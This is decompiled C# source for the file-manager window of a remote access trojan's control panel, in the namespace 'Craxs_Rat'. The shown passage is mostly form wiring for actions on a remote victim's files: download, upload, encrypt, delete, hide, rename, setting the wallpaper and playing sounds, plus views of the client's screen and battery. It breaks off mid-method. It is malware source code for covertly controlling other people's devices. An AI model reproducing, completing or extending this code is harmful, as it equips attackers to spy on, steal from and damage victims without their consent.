using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;
using Craxs_Rat.My;
using DrakeUI.Framework;
using MetroSet_UI.Controls;
using MetroSet_UI.Enums;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Vip.Notification;

namespace Craxs_Rat
{
	// Token: 0x020000B8 RID: 184
	[DesignerGenerated]
	public partial class FileManager : Form
	{
		// Token: 0x06000C5F RID: 3167 RVA: 0x00081204 File Offset: 0x0007F404
		public FileManager()
		{
			base.Load += this.FileManager_Load;
			base.FormClosing += this.FileManager_FormClosing;
			this.string_0 = "null";
			this.string_1 = "n/a";
			this.int_0 = -1;
			this.collection_0 = new Collection();
			this.string_2 = "Large text editing is not allowed {1}  -->{0}";
			this.string_3 = "20";
			this.bool_0 = false;
			this.collection_1 = new Collection();
			this.string_5 = Module8.string_1 + "\\Thumbs";
			this.arrays_0 = new List<Array>();
			this.bool_1 = false;
			this.pictureBox_0 = new PictureBox();
			this.dataGridViewRows_0 = new List<DataGridViewRow>();
			this.InitializeComponent();
		}

		// Token: 0x1700038F RID: 911
		// (get) Token: 0x06000C62 RID: 3170 RVA: 0x000065AC File Offset: 0x000047AC
		// (set) Token: 0x06000C63 RID: 3171 RVA: 0x00084CEC File Offset: 0x00082EEC
		internal virtual ContextMenuStrip ctxMenu
		{
			[CompilerGenerated]
			get
			{
				return this._ctxMenu;
			}
			[CompilerGenerated]
			set
			{
				CancelEventHandler value2 = new CancelEventHandler(this.ctxMenu_Opening);
				ContextMenuStrip ctxMenu = this._ctxMenu;
				if (ctxMenu != null)
				{
					ctxMenu.Opening -= value2;
				}
				this._ctxMenu = value;
				ctxMenu = this._ctxMenu;
				if (ctxMenu != null)
				{
					ctxMenu.Opening += value2;
				}
			}
		}

		// Token: 0x17000390 RID: 912
		// (get) Token: 0x06000C64 RID: 3172 RVA: 0x000065B4 File Offset: 0x000047B4
		// (set) Token: 0x06000C65 RID: 3173 RVA: 0x00084D30 File Offset: 0x00082F30
		internal virtual ToolStripMenuItem DownloadToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._DownloadToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.DownloadToolStripMenuItem_Click);
				ToolStripMenuItem downloadToolStripMenuItem = this._DownloadToolStripMenuItem;
				if (downloadToolStripMenuItem != null)
				{
					downloadToolStripMenuItem.Click -= value2;
				}
				this._DownloadToolStripMenuItem = value;
				downloadToolStripMenuItem = this._DownloadToolStripMenuItem;
				if (downloadToolStripMenuItem != null)
				{
					downloadToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000391 RID: 913
		// (get) Token: 0x06000C66 RID: 3174 RVA: 0x000065BC File Offset: 0x000047BC
		// (set) Token: 0x06000C67 RID: 3175 RVA: 0x00084D74 File Offset: 0x00082F74
		internal virtual ToolStripMenuItem UploadToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._UploadToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.UploadToolStripMenuItem_Click);
				ToolStripMenuItem uploadToolStripMenuItem = this._UploadToolStripMenuItem;
				if (uploadToolStripMenuItem != null)
				{
					uploadToolStripMenuItem.Click -= value2;
				}
				this._UploadToolStripMenuItem = value;
				uploadToolStripMenuItem = this._UploadToolStripMenuItem;
				if (uploadToolStripMenuItem != null)
				{
					uploadToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170003D6 RID: 982
		// (get) Token: 0x06000C68 RID: 3176 RVA: 0x000065C4 File Offset: 0x000047C4
		// (set) Token: 0x06000C69 RID: 3177 RVA: 0x00084DB8 File Offset: 0x00082FB8
		internal virtual OpenFileDialog FilesUpload { get; set; }

		// Token: 0x17000392 RID: 914
		// (get) Token: 0x06000C6A RID: 3178 RVA: 0x000065CC File Offset: 0x000047CC
		// (set) Token: 0x06000C6B RID: 3179 RVA: 0x00084DCC File Offset: 0x00082FCC
		internal virtual ToolStripMenuItem FolderDownloadsToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._FolderDownloadsToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.FolderDownloadsToolStripMenuItem_Click);
				ToolStripMenuItem folderDownloadsToolStripMenuItem = this._FolderDownloadsToolStripMenuItem;
				if (folderDownloadsToolStripMenuItem != null)
				{
					folderDownloadsToolStripMenuItem.Click -= value2;
				}
				this._FolderDownloadsToolStripMenuItem = value;
				folderDownloadsToolStripMenuItem = this._FolderDownloadsToolStripMenuItem;
				if (folderDownloadsToolStripMenuItem != null)
				{
					folderDownloadsToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000393 RID: 915
		// (get) Token: 0x06000C6C RID: 3180 RVA: 0x000065D4 File Offset: 0x000047D4
		// (set) Token: 0x06000C6D RID: 3181 RVA: 0x00084E10 File Offset: 0x00083010
		internal virtual ToolStripMenuItem EncryptToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._EncryptToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.EncryptToolStripMenuItem_Click);
				ToolStripMenuItem encryptToolStripMenuItem = this._EncryptToolStripMenuItem;
				if (encryptToolStripMenuItem != null)
				{
					encryptToolStripMenuItem.Click -= value2;
				}
				this._EncryptToolStripMenuItem = value;
				encryptToolStripMenuItem = this._EncryptToolStripMenuItem;
				if (encryptToolStripMenuItem != null)
				{
					encryptToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000394 RID: 916
		// (get) Token: 0x06000C6E RID: 3182 RVA: 0x000065DC File Offset: 0x000047DC
		// (set) Token: 0x06000C6F RID: 3183 RVA: 0x00084E54 File Offset: 0x00083054
		internal virtual ToolStripMenuItem DecodeToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._DecodeToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.DecodeToolStripMenuItem_Click);
				ToolStripMenuItem decodeToolStripMenuItem = this._DecodeToolStripMenuItem;
				if (decodeToolStripMenuItem != null)
				{
					decodeToolStripMenuItem.Click -= value2;
				}
				this._DecodeToolStripMenuItem = value;
				decodeToolStripMenuItem = this._DecodeToolStripMenuItem;
				if (decodeToolStripMenuItem != null)
				{
					decodeToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000395 RID: 917
		// (get) Token: 0x06000C70 RID: 3184 RVA: 0x000065E4 File Offset: 0x000047E4
		// (set) Token: 0x06000C71 RID: 3185 RVA: 0x00084E98 File Offset: 0x00083098
		internal virtual ToolStripMenuItem DeleteToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._DeleteToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.DeleteToolStripMenuItem_Click);
				ToolStripMenuItem deleteToolStripMenuItem = this._DeleteToolStripMenuItem;
				if (deleteToolStripMenuItem != null)
				{
					deleteToolStripMenuItem.Click -= value2;
				}
				this._DeleteToolStripMenuItem = value;
				deleteToolStripMenuItem = this._DeleteToolStripMenuItem;
				if (deleteToolStripMenuItem != null)
				{
					deleteToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000396 RID: 918
		// (get) Token: 0x06000C72 RID: 3186 RVA: 0x000065EC File Offset: 0x000047EC
		// (set) Token: 0x06000C73 RID: 3187 RVA: 0x00084EDC File Offset: 0x000830DC
		internal virtual ToolStripMenuItem EditToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._EditToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.EditToolStripMenuItem_Click);
				ToolStripMenuItem editToolStripMenuItem = this._EditToolStripMenuItem;
				if (editToolStripMenuItem != null)
				{
					editToolStripMenuItem.Click -= value2;
				}
				this._EditToolStripMenuItem = value;
				editToolStripMenuItem = this._EditToolStripMenuItem;
				if (editToolStripMenuItem != null)
				{
					editToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000397 RID: 919
		// (get) Token: 0x06000C74 RID: 3188 RVA: 0x000065F4 File Offset: 0x000047F4
		// (set) Token: 0x06000C75 RID: 3189 RVA: 0x00084F20 File Offset: 0x00083120
		internal virtual ToolStripMenuItem ZipToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._ZipToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.ZipToolStripMenuItem_Click);
				ToolStripMenuItem zipToolStripMenuItem = this._ZipToolStripMenuItem;
				if (zipToolStripMenuItem != null)
				{
					zipToolStripMenuItem.Click -= value2;
				}
				this._ZipToolStripMenuItem = value;
				zipToolStripMenuItem = this._ZipToolStripMenuItem;
				if (zipToolStripMenuItem != null)
				{
					zipToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000398 RID: 920
		// (get) Token: 0x06000C76 RID: 3190 RVA: 0x000065FC File Offset: 0x000047FC
		// (set) Token: 0x06000C77 RID: 3191 RVA: 0x00084F64 File Offset: 0x00083164
		internal virtual ToolStripMenuItem UnZipToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._UnZipToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.UnZipToolStripMenuItem_Click);
				ToolStripMenuItem unZipToolStripMenuItem = this._UnZipToolStripMenuItem;
				if (unZipToolStripMenuItem != null)
				{
					unZipToolStripMenuItem.Click -= value2;
				}
				this._UnZipToolStripMenuItem = value;
				unZipToolStripMenuItem = this._UnZipToolStripMenuItem;
				if (unZipToolStripMenuItem != null)
				{
					unZipToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000399 RID: 921
		// (get) Token: 0x06000C78 RID: 3192 RVA: 0x00006604 File Offset: 0x00004804
		// (set) Token: 0x06000C79 RID: 3193 RVA: 0x00084FA8 File Offset: 0x000831A8
		internal virtual ToolStripMenuItem RenameToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._RenameToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.RenameToolStripMenuItem_Click);
				ToolStripMenuItem renameToolStripMenuItem = this._RenameToolStripMenuItem;
				if (renameToolStripMenuItem != null)
				{
					renameToolStripMenuItem.Click -= value2;
				}
				this._RenameToolStripMenuItem = value;
				renameToolStripMenuItem = this._RenameToolStripMenuItem;
				if (renameToolStripMenuItem != null)
				{
					renameToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700039A RID: 922
		// (get) Token: 0x06000C7A RID: 3194 RVA: 0x0000660C File Offset: 0x0000480C
		// (set) Token: 0x06000C7B RID: 3195 RVA: 0x00084FEC File Offset: 0x000831EC
		internal virtual ToolStripMenuItem HideToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._HideToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.HideToolStripMenuItem_Click);
				ToolStripMenuItem hideToolStripMenuItem = this._HideToolStripMenuItem;
				if (hideToolStripMenuItem != null)
				{
					hideToolStripMenuItem.Click -= value2;
				}
				this._HideToolStripMenuItem = value;
				hideToolStripMenuItem = this._HideToolStripMenuItem;
				if (hideToolStripMenuItem != null)
				{
					hideToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700039B RID: 923
		// (get) Token: 0x06000C7C RID: 3196 RVA: 0x00006614 File Offset: 0x00004814
		// (set) Token: 0x06000C7D RID: 3197 RVA: 0x00085030 File Offset: 0x00083230
		internal virtual ToolStripMenuItem ShowToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._ShowToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.ShowToolStripMenuItem_Click);
				ToolStripMenuItem showToolStripMenuItem = this._ShowToolStripMenuItem;
				if (showToolStripMenuItem != null)
				{
					showToolStripMenuItem.Click -= value2;
				}
				this._ShowToolStripMenuItem = value;
				showToolStripMenuItem = this._ShowToolStripMenuItem;
				if (showToolStripMenuItem != null)
				{
					showToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700039C RID: 924
		// (get) Token: 0x06000C7E RID: 3198 RVA: 0x0000661C File Offset: 0x0000481C
		// (set) Token: 0x06000C7F RID: 3199 RVA: 0x00085074 File Offset: 0x00083274
		internal virtual ToolStripMenuItem AddFilesToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._AddFilesToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.AddFilesToolStripMenuItem_Click);
				ToolStripMenuItem addFilesToolStripMenuItem = this._AddFilesToolStripMenuItem;
				if (addFilesToolStripMenuItem != null)
				{
					addFilesToolStripMenuItem.Click -= value2;
				}
				this._AddFilesToolStripMenuItem = value;
				addFilesToolStripMenuItem = this._AddFilesToolStripMenuItem;
				if (addFilesToolStripMenuItem != null)
				{
					addFilesToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700039D RID: 925
		// (get) Token: 0x06000C80 RID: 3200 RVA: 0x00006624 File Offset: 0x00004824
		// (set) Token: 0x06000C81 RID: 3201 RVA: 0x000850B8 File Offset: 0x000832B8
		internal virtual ToolStripMenuItem OpenToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._OpenToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.OpenToolStripMenuItem_Click);
				ToolStripMenuItem openToolStripMenuItem = this._OpenToolStripMenuItem;
				if (openToolStripMenuItem != null)
				{
					openToolStripMenuItem.Click -= value2;
				}
				this._OpenToolStripMenuItem = value;
				openToolStripMenuItem = this._OpenToolStripMenuItem;
				if (openToolStripMenuItem != null)
				{
					openToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170003D7 RID: 983
		// (get) Token: 0x06000C82 RID: 3202 RVA: 0x0000662C File Offset: 0x0000482C
		// (set) Token: 0x06000C83 RID: 3203 RVA: 0x000850FC File Offset: 0x000832FC
		internal virtual Timer TOpacity
		{
			[CompilerGenerated]
			get
			{
				return this._TOpacity;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.TOpacity_Tick);
				Timer topacity = this._TOpacity;
				if (topacity != null)
				{
					topacity.Tick -= value2;
				}
				this._TOpacity = value;
				topacity = this._TOpacity;
				if (topacity != null)
				{
					topacity.Tick += value2;
				}
			}
		}

		// Token: 0x1700039E RID: 926
		// (get) Token: 0x06000C84 RID: 3204 RVA: 0x00006634 File Offset: 0x00004834
		// (set) Token: 0x06000C85 RID: 3205 RVA: 0x00085140 File Offset: 0x00083340
		internal virtual ToolStripMenuItem CutToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._CutToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.CutToolStripMenuItem_Click);
				ToolStripMenuItem cutToolStripMenuItem = this._CutToolStripMenuItem;
				if (cutToolStripMenuItem != null)
				{
					cutToolStripMenuItem.Click -= value2;
				}
				this._CutToolStripMenuItem = value;
				cutToolStripMenuItem = this._CutToolStripMenuItem;
				if (cutToolStripMenuItem != null)
				{
					cutToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700039F RID: 927
		// (get) Token: 0x06000C86 RID: 3206 RVA: 0x0000663C File Offset: 0x0000483C
		// (set) Token: 0x06000C87 RID: 3207 RVA: 0x00085184 File Offset: 0x00083384
		internal virtual ToolStripMenuItem CopyToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._CopyToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.CopyToolStripMenuItem_Click);
				ToolStripMenuItem copyToolStripMenuItem = this._CopyToolStripMenuItem;
				if (copyToolStripMenuItem != null)
				{
					copyToolStripMenuItem.Click -= value2;
				}
				this._CopyToolStripMenuItem = value;
				copyToolStripMenuItem = this._CopyToolStripMenuItem;
				if (copyToolStripMenuItem != null)
				{
					copyToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170003A0 RID: 928
		// (get) Token: 0x06000C88 RID: 3208 RVA: 0x00006644 File Offset: 0x00004844
		// (set) Token: 0x06000C89 RID: 3209 RVA: 0x000851C8 File Offset: 0x000833C8
		internal virtual ToolStripMenuItem PasteToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._PasteToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.PasteToolStripMenuItem_Click);
				ToolStripMenuItem pasteToolStripMenuItem = this._PasteToolStripMenuItem;
				if (pasteToolStripMenuItem != null)
				{
					pasteToolStripMenuItem.Click -= value2;
				}
				this._PasteToolStripMenuItem = value;
				pasteToolStripMenuItem = this._PasteToolStripMenuItem;
				if (pasteToolStripMenuItem != null)
				{
					pasteToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170003A1 RID: 929
		// (get) Token: 0x06000C8A RID: 3210 RVA: 0x0000664C File Offset: 0x0000484C
		// (set) Token: 0x06000C8B RID: 3211 RVA: 0x0008520C File Offset: 0x0008340C
		internal virtual ToolStripMenuItem SetWallpaperToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._SetWallpaperToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.SetWallpaperToolStripMenuItem_Click);
				ToolStripMenuItem setWallpaperToolStripMenuItem = this._SetWallpaperToolStripMenuItem;
				if (setWallpaperToolStripMenuItem != null)
				{
					setWallpaperToolStripMenuItem.Click -= value2;
				}
				this._SetWallpaperToolStripMenuItem = value;
				setWallpaperToolStripMenuItem = this._SetWallpaperToolStripMenuItem;
				if (setWallpaperToolStripMenuItem != null)
				{
					setWallpaperToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170003A2 RID: 930
		// (get) Token: 0x06000C8C RID: 3212 RVA: 0x00006654 File Offset: 0x00004854
		// (set) Token: 0x06000C8D RID: 3213 RVA: 0x00085250 File Offset: 0x00083450
		internal virtual ToolStripMenuItem PlaySoundToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._PlaySoundToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.PlaySoundToolStripMenuItem_Click);
				ToolStripMenuItem playSoundToolStripMenuItem = this._PlaySoundToolStripMenuItem;
				if (playSoundToolStripMenuItem != null)
				{
					playSoundToolStripMenuItem.Click -= value2;
				}
				this._PlaySoundToolStripMenuItem = value;
				playSoundToolStripMenuItem = this._PlaySoundToolStripMenuItem;
				if (playSoundToolStripMenuItem != null)
				{
					playSoundToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170003D8 RID: 984
		// (get) Token: 0x06000C8E RID: 3214 RVA: 0x0000665C File Offset: 0x0000485C
		// (set) Token: 0x06000C8F RID: 3215 RVA: 0x00085294 File Offset: 0x00083494
		internal virtual ToolTip ToolTip1 { get; set; }

		// Token: 0x170003A3 RID: 931
		// (get) Token: 0x06000C90 RID: 3216 RVA: 0x00006664 File Offset: 0x00004864
		// (set) Token: 0x06000C91 RID: 3217 RVA: 0x000852A8 File Offset: 0x000834A8
		internal virtual Label ThumbsCont { get; set; }

		// Token: 0x170003A4 RID: 932
		// (get) Token: 0x06000C92 RID: 3218 RVA: 0x0000666C File Offset: 0x0000486C
		// (set) Token: 0x06000C93 RID: 3219 RVA: 0x000852BC File Offset: 0x000834BC
		internal virtual Panel Panel1 { get; set; }

		// Token: 0x170003A5 RID: 933
		// (get) Token: 0x06000C94 RID: 3220 RVA: 0x00006674 File Offset: 0x00004874
		// (set) Token: 0x06000C95 RID: 3221 RVA: 0x000852D0 File Offset: 0x000834D0
		internal virtual Timer Timer1
		{
			[CompilerGenerated]
			get
			{
				return this._Timer1;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer1_Tick);
				Timer timer = this._Timer1;
				if (timer != null)
				{
					timer.Tick -= value2;
				}
				this._Timer1 = value;
				timer = this._Timer1;
				if (timer != null)
				{
					timer.Tick += value2;
				}
			}
		}

		// Token: 0x170003A6 RID: 934
		// (get) Token: 0x06000C96 RID: 3222 RVA: 0x0000667C File Offset: 0x0000487C
		// (set) Token: 0x06000C97 RID: 3223 RVA: 0x00085314 File Offset: 0x00083514
		internal virtual DataGridView DGVDATA { get; set; }

		// Token: 0x170003A7 RID: 935
		// (get) Token: 0x06000C98 RID: 3224 RVA: 0x00006684 File Offset: 0x00004884
		// (set) Token: 0x06000C99 RID: 3225 RVA: 0x00085328 File Offset: 0x00083528
		internal virtual DataGridViewTextBoxColumn N { get; set; }

		// Token: 0x170003A8 RID: 936
		// (get) Token: 0x06000C9A RID: 3226 RVA: 0x0000668C File Offset: 0x0000488C
		// (set) Token: 0x06000C9B RID: 3227 RVA: 0x0008533C File Offset: 0x0008353C
		internal virtual DataGridViewTextBoxColumn P { get; set; }

		// Token: 0x170003A9 RID: 937
		// (get) Token: 0x06000C9C RID: 3228 RVA: 0x00006694 File Offset: 0x00004894
		// (set) Token: 0x06000C9D RID: 3229 RVA: 0x00085350 File Offset: 0x00083550
		internal virtual DataGridViewTextBoxColumn S { get; set; }

		// Token: 0x170003AA RID: 938
		// (get) Token: 0x06000C9E RID: 3230 RVA: 0x0000669C File Offset: 0x0000489C
		// (set) Token: 0x06000C9F RID: 3231 RVA: 0x00085364 File Offset: 0x00083564
		internal virtual DataGridViewTextBoxColumn D { get; set; }

		// Token: 0x170003AB RID: 939
		// (get) Token: 0x06000CA0 RID: 3232 RVA: 0x000066A4 File Offset: 0x000048A4
		// (set) Token: 0x06000CA1 RID: 3233 RVA: 0x00085378 File Offset: 0x00083578
		internal virtual DataGridViewTextBoxColumn ST { get; set; }

		// Token: 0x170003AC RID: 940
		// (get) Token: 0x06000CA2 RID: 3234 RVA: 0x000066AC File Offset: 0x000048AC
		// (set) Token: 0x06000CA3 RID: 3235 RVA: 0x0008538C File Offset: 0x0008358C
		internal virtual Label Label2 { get; set; }

		// Token: 0x170003AD RID: 941
		// (get) Token: 0x06000CA4 RID: 3236 RVA: 0x000066B4 File Offset: 0x000048B4
		// (set) Token: 0x06000CA5 RID: 3237 RVA: 0x000853A0 File Offset: 0x000835A0
		internal virtual PictureBox ClientPic
		{
			[CompilerGenerated]
			get
			{
				return this._ClientPic;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.ClientPic_MouseEnter);
				PictureBox clientPic = this._ClientPic;
				if (clientPic != null)
				{
					clientPic.MouseEnter -= value2;
				}
				this._ClientPic = value;
				clientPic = this._ClientPic;
				if (clientPic != null)
				{
					clientPic.MouseEnter += value2;
				}
			}
		}

		// Token: 0x170003AE RID: 942
		// (get) Token: 0x06000CA6 RID: 3238 RVA: 0x000066BC File Offset: 0x000048BC
		// (set) Token: 0x06000CA7 RID: 3239 RVA: 0x000853E4 File Offset: 0x000835E4
		internal virtual PictureBox usrscreen { get; set; }

		// Token: 0x170003AF RID: 943
		// (get) Token: 0x06000CA8 RID: 3240 RVA: 0x000066C4 File Offset: 0x000048C4
		// (set) Token: 0x06000CA9 RID: 3241 RVA: 0x000853F8 File Offset: 0x000835F8
		internal virtual PictureBox Usrbtry
		{
			[CompilerGenerated]
			get
			{
				return this._Usrbtry;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.Usrbtry_MouseEnter);
				PictureBox usrbtry = this._Usrbtry;
				if (usrbtry != null)
				{
					usrbtry.MouseEnter -= value2;
				}
				this._Usrbtry = value;
				usrbtry = this._Usrbtry;
				if (usrbtry != null)
				{
					usrbtry.MouseEnter += value2;
				}
			}
		}

		// Token: 0x170003B0 RID: 944
		// (get) Token: 0x06000CAA RID: 3242 RVA: 0x000066CC File Offset: 0x000048CC
		// (set) Token: 0x06000CAB RID: 3243 RVA: 0x0008543C File Offset: 0x0008363C
		internal virtual Panel Panel2 { get; set; }

		// Token: 0x170003B1 RID: 945
		// (get) Token: 0x06000CAC RID: 3244 RVA: 0x000066D4 File Offset: 0x000048D4
		// (set) Token: 0x06000CAD RID: 3245 RVA: 0x00085450 File Offset: 0x00083650
		internal virtual MetroSetBadge Downpic
		{
			[CompilerGenerated]
			get
			{
				return this._Downpic;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.Downpic_Click);
				MetroSetBadge downpic = this._Downpic;
				if (downpic != null)
				{
					downpic.Click -= value2;
				}
				this._Downpic = value;
				downpic = this._Downpic;
				if (downpic != null)
				{
					downpic.Click += value2;
				}
			}
		}

		// Token: 0x170003D9 RID: 985
		// (get) Token: 0x06000CAE RID: 3246 RVA: 0x000066DC File Offset: 0x000048DC
		// (set) Token: 0x06000CAF RID: 3247 RVA: 0x00085494 File Offset: 0x00083694
		internal virtual DrakeUIToolTip DrakeUIToolTip1 { get; set; }

		// Token: 0x170003B2 RID: 946
		// (get) Token: 0x06000CB0 RID: 3248 RVA: 0x000066E4 File Offset: 0x000048E4
		// (set) Token: 0x06000CB1 RID: 3249 RVA: 0x000854A8 File Offset: 0x000836A8
		internal virtual ProgressBar PB { get; set; }

		// Token: 0x170003B3 RID: 947
		// (get) Token: 0x06000CB2 RID: 3250 RVA: 0x000066EC File Offset: 0x000048EC
		// (set) Token: 0x06000CB3 RID: 3251 RVA: 0x000854BC File Offset: 0x000836BC
		internal virtual DrakeWidth_W DrakeWidth_W1 { get; set; }

		// Token: 0x170003DA RID: 986
		// (get) Token: 0x06000CB4 RID: 3252 RVA: 0x000066F4 File Offset: 0x000048F4
		// (set) Token: 0x06000CB5 RID: 3253 RVA: 0x000854D0 File Offset: 0x000836D0
		internal virtual Timer Timer2
		{
			[CompilerGenerated]
			get
			{
				return this._Timer2;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer2_Tick);
				Timer timer = this._Timer2;
				if (timer != null)
				{
					timer.Tick -= value2;
				}
				this._Timer2 = value;
				timer = this._Timer2;
				if (timer != null)
				{
					timer.Tick += value2;
				}
			}
		}

		// Token: 0x170003B4 RID: 948
		// (get) Token: 0x06000CB6 RID: 3254 RVA: 0x000066FC File Offset: 0x000048FC
		// (set) Token: 0x06000CB7 RID: 3255 RVA: 0x00085514 File Offset: 0x00083714
		internal virtual Panel Panel6 { get; set; }

		// Token: 0x170003B5 RID: 949
		// (get) Token: 0x06000CB8 RID: 3256 RVA: 0x00006704 File Offset: 0x00004904
		// (set) Token: 0x06000CB9 RID: 3257 RVA: 0x00085528 File Offset: 0x00083728
		internal virtual Label seentext { get; set; }

		// Token: 0x170003B6 RID: 950
		// (get) Token: 0x06000CBA RID: 3258 RVA: 0x0000670C File Offset: 0x0000490C
		// (set) Token: 0x06000CBB RID: 3259 RVA: 0x0008553C File Offset: 0x0008373C
		internal virtual Label Selecttext { get; set; }

		// Token: 0x170003B7 RID: 951
		// (get) Token: 0x06000CBC RID: 3260 RVA: 0x00006714 File Offset: 0x00004914
		// (set) Token: 0x06000CBD RID: 3261 RVA: 0x00085550 File Offset: 0x00083750
		internal virtual Label CountText { get; set; }

		// Token: 0x170003B8 RID: 952
		// (get) Token: 0x06000CBE RID: 3262 RVA: 0x0000671C File Offset: 0x0000491C
		// (set) Token: 0x06000CBF RID: 3263 RVA: 0x00085564 File Offset: 0x00083764
		internal virtual Label clinumb { get; set; }

		// Token: 0x170003B9 RID: 953
		// (get) Token: 0x06000CC0 RID: 3264 RVA: 0x00006724 File Offset: 0x00004924
		// (set) Token: 0x06000CC1 RID: 3265 RVA: 0x00085578 File Offset: 0x00083778
		internal virtual PictureBox viwimage
		{
			[CompilerGenerated]
			get
			{
				return this._viwimage;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.viwimage_MouseEnter);
				EventHandler value3 = new EventHandler(this.viwimage_MouseLeave);
				PictureBox viwimage = this._viwimage;
				if (viwimage != null)
				{
					viwimage.MouseEnter -= value2;
					viwimage.MouseLeave -= value3;
				}
				this._viwimage = value;
				viwimage = this._viwimage;
				if (viwimage != null)
				{
					viwimage.MouseEnter += value2;
					viwimage.MouseLeave += value3;
				}
			}
		}

		// Token: 0x170003BA RID: 954
		// (get) Token: 0x06000CC2 RID: 3266 RVA: 0x0000672C File Offset: 0x0000492C
		// (set) Token: 0x06000CC3 RID: 3267 RVA: 0x000855D8 File Offset: 0x000837D8
		internal virtual DrakeUIButtonIcon sdbtn
		{
			[CompilerGenerated]
			get
			{
				return this._sdbtn;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.sdbtn_Click);
				DrakeUIButtonIcon sdbtn = this._sdbtn;
				if (sdbtn != null)
				{
					sdbtn.Click -= value2;
				}
				this._sdbtn = value;
				sdbtn = this._sdbtn;
				if (sdbtn != null)
				{
					sdbtn.Click += value2;
				}
			}
		}

		// Token: 0x170003BB RID: 955
		// (get) Token: 0x06000CC4 RID: 3268 RVA: 0x00006734 File Offset: 0x00004934
		// (set) Token: 0x06000CC5 RID: 3269 RVA: 0x0008561C File Offset: 0x0008381C
		internal virtual DrakeUIButtonIcon dcmbtn
		{
			[CompilerGenerated]
			get
			{
				return this._dcmbtn;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.dcmbtn_Click);
				DrakeUIButtonIcon dcmbtn = this._dcmbtn;
				if (dcmbtn != null)
				{
